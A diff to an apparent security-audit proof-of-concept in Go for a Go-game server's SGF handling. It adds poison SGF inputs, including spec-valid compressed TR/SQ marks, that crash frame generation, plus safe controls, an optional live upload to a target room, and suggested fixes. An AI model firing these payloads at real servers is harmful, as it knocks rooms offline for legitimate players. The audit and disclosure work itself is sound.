@@ -1132,35 +1132,71 @@ func pocCS1() {
 // (coord.go:44). FromSGF commits the state before frame generation, so the
 // poison persists (ToSGFIX writes SQ[]/TR[] back) and re-bricks the room on
 // every join/reload; whole-server crash if the room's OGS plugin is active.
+//
+// STRUCTURAL SCOPE (audited across all SGF mark/annotation properties):
+//   - TR/SQ sink: ANY value != 2 letters nil-derefs — empty [], 1-char [!], AND
+//     a *spec-valid* compressed point-rectangle TR[aa:cc] / SQ[aa:cc]. The last
+//     is the dangerous one: it is legal SGF that real Go clients (KGS, OGS,
+//     Sabaki, gomill) emit, so an *honest* uploaded SGF with a marked region
+//     bricks the board — no attacker required. This is an interop bug, not just
+//     a malformed-input bug.
+//   - Only TR, SQ (this) and LB (B1) are structurally rendered server-side.
+//     CR/MA/SL/AR/LN/DD are stored but never parsed by generateMarks, so they do
+//     NOT crash — the mark poison surface is exactly {TR, SQ, LB}. (Shown by the
+//     "safe controls" below, and the reason FuzzSGFPipeline converges here fast.)
 func pocB2() {
-	banner("b2", "Empty/invalid TR/SQ mark = persistent poison-pill (nil-deref in GenerateFullFrame)")
-	for _, sgf := range []string{"(;GM[1]FF[4]SZ[19]SQ[])", "(;GM[1]FF[4]SZ[19]TR[])", "(;GM[1]FF[4]SZ[19]SQ[!])"} {
+	banner("b2", "Invalid/compressed TR/SQ mark = persistent poison-pill (nil-deref in GenerateFullFrame)")
+	poisons := []string{
+		"(;GM[1]FF[4]SZ[19]SQ[])",      // empty
+		"(;GM[1]FF[4]SZ[19]TR[])",      // empty
+		"(;GM[1]FF[4]SZ[19]SQ[!])",     // 1-char / non-letter
+		"(;GM[1]FF[4]SZ[19]TR[aa:cc])", // SPEC-VALID compressed rectangle (interop!)
+		"(;GM[1]FF[4]SZ[19]SQ[aa:cc])", // SPEC-VALID compressed rectangle (interop!)
+	}
+	for _, sgf := range poisons {
 		func() {
 			defer func() {
 				if r := recover(); r != nil {
-					fmt.Printf("  %-28q -> GenerateFullFrame PANIC: %v\n", sgf, r)
+					fmt.Printf("  POISON %-30q -> GenerateFullFrame PANIC: %v\n", sgf, r)
 				}
 			}()
 			s, err := state.FromSGF(sgf)
 			if err != nil {
-				fmt.Printf("  %-28q -> FromSGF err: %v\n", sgf, err)
+				fmt.Printf("  POISON %-30q -> FromSGF err: %v\n", sgf, err)
 				return
 			}
 			_ = s.GenerateFullFrame(state.Full)
-			fmt.Printf("  %-28q -> no panic (unexpected)\n", sgf)
+			fmt.Printf("  POISON %-30q -> no panic (unexpected)\n", sgf)
+		}()
+	}
+	// Safe controls: other mark/annotation properties are stored but not rendered
+	// -> no crash. Proves the sink is bounded to {TR, SQ, LB}.
+	for _, sgf := range []string{"(;GM[1]FF[4]SZ[19]CR[])", "(;GM[1]FF[4]SZ[19]MA[])", "(;GM[1]FF[4]SZ[19]AR[aa:bb])"} {
+		func() {
+			defer func() {
+				if r := recover(); r != nil {
+					fmt.Printf("  CONTROL %-29q -> unexpected PANIC: %v\n", sgf, r)
+				}
+			}()
+			s, err := state.FromSGF(sgf)
+			if err == nil && s != nil {
+				_ = s.GenerateFullFrame(state.Full)
+			}
+			fmt.Printf("  CONTROL %-29q -> no panic (not a sink, as expected)\n", sgf)
 		}()
 	}
 	if target != "" {
-		b64 := base64.StdEncoding.EncodeToString([]byte("(;GM[1]FF[4]SZ[19]SQ[])"))
+		b64 := base64.StdEncoding.EncodeToString([]byte("(;GM[1]FF[4]SZ[19]TR[aa:cc])"))
 		resp, err := http.Post("http://"+target+"/api/v1/room/poc-b2", "application/json",
 			strings.NewReader(event("upload_sgf", fmt.Sprintf("%q", b64))))
 		if err == nil {
 			_ = resp.Body.Close()
-			fmt.Println("e2e: uploaded (;SQ[]) to room poc-b2 — it now bricks on every join (and persists).")
+			fmt.Println("e2e: uploaded (;TR[aa:cc]) to room poc-b2 — it now bricks on every join (and persists).")
 		}
 	}
-	fmt.Println(">> CONFIRMED: unauthenticated upload_sgf with an empty TR/SQ mark permanently bricks the room;")
-	fmt.Println(">> same class as B1/LB. Fix: nil-check in CoordSet.Add and skip nil coords in generateMarks.")
+	fmt.Println(">> CONFIRMED: unauthenticated upload_sgf with an empty/1-char/compressed TR/SQ mark permanently")
+	fmt.Println(">> bricks the room; same class as B1/LB. Fix: nil-check in CoordSet.Add, skip nil coords in")
+	fmt.Println(">> generateMarks, and expand compressed point ranges (aa:cc) before FromLetters.")
 }
 
 func pocB1() {
